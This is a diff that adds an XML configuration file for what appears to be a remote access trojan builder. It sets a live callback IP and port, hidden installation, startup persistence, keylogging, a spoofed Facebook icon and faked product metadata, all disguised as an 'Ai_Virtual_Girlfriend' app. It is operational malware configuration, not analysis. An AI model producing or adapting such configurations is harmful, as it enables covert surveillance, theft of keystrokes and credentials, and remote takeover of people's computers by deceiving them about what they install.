@@ -1,0 +1,29 @@
+<settings>
+  <Tag>Ai_Virtual_GirlFriend</Tag>
+  <Hosts>16.171.63.201:4782;</Hosts>
+  <Delay>3000</Delay>
+  <Mutex>ffaafd87-b6ef-49dd-b045-a503cdc7e996</Mutex>
+  <UnattendedMode>False</UnattendedMode>
+  <InstallClient>True</InstallClient>
+  <InstallName>Ai_Virtual_Girlfriend</InstallName>
+  <InstallPath>3</InstallPath>
+  <InstallSub>SubDir</InstallSub>
+  <HideFile>True</HideFile>
+  <HideSubDirectory>True</HideSubDirectory>
+  <AddStartup>True</AddStartup>
+  <RegistryName>Ai_Virtual_Girlfriend</RegistryName>
+  <ChangeIcon>True</ChangeIcon>
+  <IconPath>C:\Users\Administrator\Downloads\Facebook DP.ico</IconPath>
+  <ChangeAsmInfo>True</ChangeAsmInfo>
+  <Keylogger>True</Keylogger>
+  <LogDirectoryName>Logs</LogDirectoryName>
+  <HideLogDirectory>False</HideLogDirectory>
+  <ProductName>Ai_Virtual_Girlfriend</ProductName>
+  <Description>Ai_Virtual_Girlfriend</Description>
+  <CompanyName>Ai_Virtual_Girlfriend</CompanyName>
+  <Copyright>Ai_Virtual_Girlfriend</Copyright>
+  <Trademarks>Ai_Virtual_Girlfriend</Trademarks>
+  <OriginalFilename>Ai_Virtual_Girlfriend</OriginalFilename>
+  <ProductVersion>1.5.6.7</ProductVersion>
+  <FileVersion>1.5.6.7</FileVersion>
+</settings>
